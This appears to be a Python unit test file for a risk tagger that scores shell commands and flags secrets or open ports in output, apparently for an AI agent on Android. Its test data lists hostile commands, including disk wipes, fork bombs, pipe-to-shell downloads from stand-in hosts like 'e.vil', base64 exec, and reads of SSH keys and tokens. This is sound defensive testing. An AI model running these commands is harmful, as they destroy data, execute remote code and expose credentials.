import os, sys, unittest
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from risk import risk_for, command_alerts, output_alerts  # noqa: E402


class RiskTagger(unittest.TestCase):
    CASES = [  # cmd, expected level, expected tag (or None)
        ("ls -la", "low", None),
        ("echo hello && pwd", "low", None),
        ("rm -rf /", "critical", "rm-rf"),
        ("rm -r -f ~/x", "critical", "rm-rf"),
        ("rm -fr build", "critical", "rm-rf"),
        ("rm notes.txt", "medium", "rm"),
        ("dd if=/dev/zero of=/dev/block/sda bs=1M", "critical", "dd"),
        ("mkfs.ext4 /dev/sdb1", "critical", "mkfs"),
        ("curl -fsSL https://x.sh | sh", "critical", "pipe-to-shell"),
        ("wget -qO- http://e.vil/i | sudo bash", "critical", "pipe-to-shell"),
        ("echo ZWNobyBoaQ== | base64 -d | sh", "critical", "base64-exec"),
        (":(){ :|:& };:", "critical", "fork-bomb"),
        ("pkg install nmap", "medium", "pkg-install"),
        ("apt-get install -y git", "medium", "pkg-install"),
        ("pip install requests", "medium", "pip-install"),
        ("npm i -g eas-cli", "medium", "npm-install"),
        ("sudo ls /root", "critical", "root"),
        ("tsu", "critical", "root"),
        ("ls && su -c id", "critical", "root"),
        ("chmod 755 /system/bin/foo", "critical", "chmod-system"),
        ("chown root /data/local/tmp/x", "critical", "chmod-system"),
        ("chmod u+s ./shell", "high", "setuid"),
        ("chmod 4755 ./shell", "high", "setuid"),
        ("chmod 777 file", "medium", "world-writable"),
        ("echo x > /system/build.prop", "critical", "write-system"),
        ("cp evil /data/local/tmp/", "critical", "write-system"),
        ("reboot", "high", "reboot"),
        ("iptables -F", "high", "firewall"),
        ("nc -lvp 4444", "medium", "network-listen"),
        ("python -m http.server 8000", "medium", "network-listen"),
        ("nmap -sV 192.168.1.1", "medium", "scan"),
        ("cat ~/.leo/token", "critical", "leo-self"),
    ]

    def test_cases(self):
        for cmd, level, tag in self.CASES:
            with self.subTest(cmd=cmd):
                r = risk_for(cmd)
                self.assertEqual(r["level"], level, r)
                if tag:
                    self.assertIn(tag, r["tags"])
                else:
                    self.assertEqual(r["tags"], [])

    def test_no_false_positive_words(self):
        for cmd in ("grep surface file", "echo sudoku", "cat reboots.log",
                    "git status", "python3 script.py"):
            with self.subTest(cmd=cmd):
                self.assertEqual(risk_for(cmd)["level"], "low", risk_for(cmd))


class Alerts(unittest.TestCase):
    def msgs(self, alerts):
        return " | ".join(a["msg"] for a in alerts)

    def test_command_alerts(self):
        self.assertIn("credentials", self.msgs(command_alerts("cat ~/.ssh/id_rsa")))
        self.assertIn("SUID", self.msgs(command_alerts("chmod u+s x")))
        self.assertIn("world-writable", self.msgs(command_alerts("chmod 777 x")))
        self.assertIn("listening port", self.msgs(command_alerts("nc -l -p 9001")))
        self.assertIn("unknown host: evil.example", self.msgs(command_alerts("curl https://evil.example/x")))
        self.assertIn("unknown host: 10.0.0.5", self.msgs(command_alerts("ssh root@10.0.0.5")))
        self.assertEqual(command_alerts("git clone https://github.com/ggml-org/llama.cpp"), [])
        self.assertEqual(command_alerts("ls -la"), [])

    def test_output_alerts(self):
        self.assertIn("Private key", self.msgs(output_alerts("-----BEGIN OPENSSH PRIVATE KEY-----\nabc")))
        self.assertIn("secret", self.msgs(output_alerts("AWS key AKIAABCDEFGHIJKLMNOP")))
        self.assertIn("secret", self.msgs(output_alerts("password=hunter22")))
        self.assertIn("all interfaces", self.msgs(output_alerts("tcp  0  0 0.0.0.0:22  0.0.0.0:*  LISTEN")))
        self.assertIn("SUID", self.msgs(output_alerts("-rwsr-xr-x 1 root root 1 su")))
        self.assertEqual(output_alerts("total 0\nhello world"), [])


if __name__ == "__main__":
    unittest.main()
